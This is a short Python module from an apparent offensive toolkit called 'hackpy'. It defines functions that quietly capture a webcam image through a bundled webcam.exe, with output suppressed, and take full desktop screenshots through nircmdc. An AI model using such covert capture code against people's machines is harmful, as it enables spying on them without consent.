import os
import random
from hackpy.info     import *
from hackpy.settings import *
from hackpy.commands import *

def webcamScreenshot(filename = 'screenshot-' + str(random.randint(1, 99999)) + '.png', delay = 4500, camera = 1):
    ##|
    ##| Make webcam screenshot:
    ##| hackpy.webcamScreenshot(filename='webcam.png', delay=5000, camera=1)
    ##|
    command.system(module_location + r'\executable\webcam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera) + devnull)
    if os.path.exists(filename):
        return filename
    else:
        return False

def desktopScreenshot(filename = 'screenshot-' + str(random.randint(1, 99999)) + '.png'):
    ##|
    ##| Make screenshot of desktop
    ##| hackpy.desktopScreenshot(filename='desktop.png')
    ##|
    command.nircmdc('savescreenshotfull ' + filename)
    if os.path.exists(filename):
        return filename
    else:
        return False